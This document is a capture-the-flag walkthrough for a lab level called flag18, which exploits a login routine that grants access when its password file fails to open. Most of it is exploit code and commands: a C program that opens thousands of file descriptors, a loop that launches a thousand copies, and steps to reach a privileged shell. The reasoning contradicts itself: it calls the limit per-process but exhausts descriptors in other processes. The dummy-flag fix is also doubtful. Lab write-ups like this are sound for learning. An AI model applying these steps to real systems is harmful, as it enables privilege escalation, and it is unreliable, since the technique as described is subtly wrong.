
---
### 📘 Overview

> The binary `flag18` manages shell access via a global flag. Normally, authentication through a password file is required to flip this flag.  
> However, if the file can’t be opened, the program grants access **anyway**.
> 
> Our mission? Exploit this flawed logic by **starving the process of file descriptors**.

**User:** `level18`  
**Target Binary:** `/home/flag18/flag18`  
**Privilege Escalation Goal:** Gain access to shell as `flag18` by triggering the fallback login path.

---

### 🔍 Vulnerability Mechanics

Inside the source code, the login logic operates as follows:

```c
fp = fopen(PWFILE, "r");
if (fp) {
   // Validate password...
} else {
   globals.loggedin = 1;  // Bypass triggered if file can't be opened
}
```

🚨 The problem is clear:

- If the **password file can’t be opened**, the user is **still logged in**.
    
- The assumption is that the file **always opens** — which we’ll break.
    

---

### 🧨 Exploit Concept

The Linux kernel enforces a **limit on open file descriptors per process**. If we **saturate the system with open files**, the vulnerable program won’t be able to `fopen()` the password file — triggering the insecure fallback behavior.

---

### 🧪 Step-by-Step Attack Plan

---

#### 🔧 Step 1: Saturate File Descriptors

We’ll build a small C program to open hundreds (or thousands) of files:

```c
// filed.c
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>

int main() {
    for (int i = 0; i < 4096; i++) {
        open("/dev/null", O_RDONLY);
    }
    pause();  // keep process alive
    return 0;
}
```

Compile and deploy many instances:

```bash
gcc filed.c -o filed
for i in $(seq 1 1000); do ./filed & done
```

📌 This opens thousands of file descriptors across processes.

---

#### 🧪 Step 2: Launch the Vulnerable Binary

Open a second terminal and run:

```bash
./flag18 -d /dev/tty -v
```

🔸 This enables debug mode with verbose output.

At the prompt, type:

```bash
login
```

✅ If file descriptors are properly exhausted, the program **can’t read the password file** — and logs you in **without any password**.

---

#### ⚠️ Step 3: Prevent Shell Argument Breakage

The program later calls `/bin/sh` via:

```c
execve("/bin/sh", argv, envp);
```

But `argv` includes `-d /dev/tty -v`, which are **invalid shell arguments** and cause a crash.

Fix this by prepending a benign dummy flag:

```bash
./flag18 --safe -d /dev/tty -v
```

This tricks the shell into ignoring the dangerous flags.

---

#### 🚪 Step 4: Free Up the Descriptors

Once you’re logged in:

```bash
killall filed
```

This clears the exhaustion state so the shell can spawn successfully.

Then run:

```bash
shell
```

🥁 You now have a shell as `flag18`.

---

#### 🏁 Step 5: Claim the Prize

```bash
getflag
```

✅ Output:

```
You have successfully executed getflag on a target account
```

---

### 🧩 Exploit Flow Summary

```
1. Saturate the system with open FDs via mass processes
2. Launch ./flag18 using a harmless dummy flag
3. Trigger fallback login by exhausting file descriptors
4. Kill mass file opener processes
5. Launch 'shell' cleanly
6. Extract the flag with 'getflag'
```

---

### 📚 Lessons Learned

- **Exploiting assumptions** in code paths (e.g., “file will always open”) is a powerful tactic.
    
- Understanding Linux internals like **file descriptor limits** can open unexpected attack vectors.
    
- **Resource exhaustion** is not just a DoS — it can lead to **logic bypasses** and privilege escalation.
    
- Sometimes, **fixing argument vectors** can be as critical as the exploit itself.
    

---
